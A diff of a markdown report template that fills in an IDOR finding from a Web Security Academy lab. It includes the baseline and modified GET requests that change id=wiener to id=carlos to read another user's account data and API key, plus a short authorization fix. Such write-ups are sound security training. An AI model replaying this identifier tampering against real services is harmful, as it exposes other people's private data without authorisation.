@@ -11,30 +11,39 @@
 
 ## Scope & Target
 
-- **Endpoint/Param:** <full path + parameter or path piece>
-- **Auth context:** <who you were logged in as>
-- **Method:** <GET/POST/PUT/DELETE>
+- **Endpoint/Param:** /my-account?id=<username>
+- **Auth context:** logged in as wiener
+- **Method:** GET
 
 ## Steps to Reproduce
 
 1. Send baseline request for your own object and save response.
 2. Modify the identifier (e.g., id=1→2 or user=wiener→carlos) and resend.
 3. Observe unauthorized data/functionality.
+   **Baseline (your object):**
+   GET /my-account?id=wiener HTTP/2
+   Host: <lab-host>.web-security-academy.net
+   Cookie: session=<redacted>
+
+**Modified (other user's object):**
+GET /my-account?id=carlos HTTP/2
+Host: <lab-host>.web-security-academy.net
+Cookie: session=<redacted>
 
 ## Evidence
 
-- **Screenshot:** evidence/ps-idor/ps-004-screenshot.png
-- **Request:** evidence/ps-idor/ps-004-request.txt
+- Screenshot:
+  [PS-004]! (../../evidence/ps-idor/ps-004-screenshot.png)
+- Request:
+  [PS-004-request.txt](../../evidence/ps%20idor/ps-004-request.rtf)
 
 ## Impact
 
-Unauthorized access/modification of another user’s data (privacy breach, account tampering).
+Attacker can view another user’s private data and API key.
 
 ## Recommended Fix
 
-- **Server-side** object-level authorization on each request.
-- Use indirect references or unguessable IDs where feasible.
-- Log/alert denied attempts; return generic errors.
+Enforce server-side object-level authorization (BOLA), use indirect IDs, log + alert.
 
 ## ATT&CK / CWE
 
